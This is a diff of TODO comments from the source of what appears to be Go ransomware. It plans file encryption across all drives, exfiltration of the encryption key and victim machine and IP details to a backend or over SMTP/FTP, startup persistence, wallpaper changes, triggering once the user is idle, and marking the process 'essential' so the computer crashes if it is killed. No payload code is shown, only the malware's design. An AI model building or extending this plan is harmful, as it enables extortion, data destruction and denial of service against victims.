@@ -11,16 +11,19 @@ import (
 	"sync"
 )
 
-//TODO: uncheck read only from files if able to do so
-//Sends encryption key, computer and ip details to a backend (as JSON)
-//Files are decryptable with the same exe when providing the decryption parameters to the process
-//Generates a thread for all drives (so encryption is faster)
+//TODO:
+//make a package that checks user idle time using xinput test-xi2 --root for linux and winapi for windows
+//if xinput isn't installed check some other way?
+//uncheck read only from files if able to do so and check if it doesn't ignore readonly from windows files
+//Send encryption key, computer and ip details to a backend (as JSON)
 //Other options to send encryption key, i.e. smtp/ftp
 //Add advanced settings like wait for internet and when to send the key (adt the start or at the end of encryption)
 //add the option to change the user's wallpaper
 //add stuff to startup*
 //check if unicode paths work correctly
 //maybe add a setting to start the ransomware when the user was afk for more than X minutes
+//clean the main function making functions in the ransomware package
+//on windows persistence could be added by marking the process as "essential", making the computer BSOD on process exit
 
 func init() {
 	//wait until there's internet
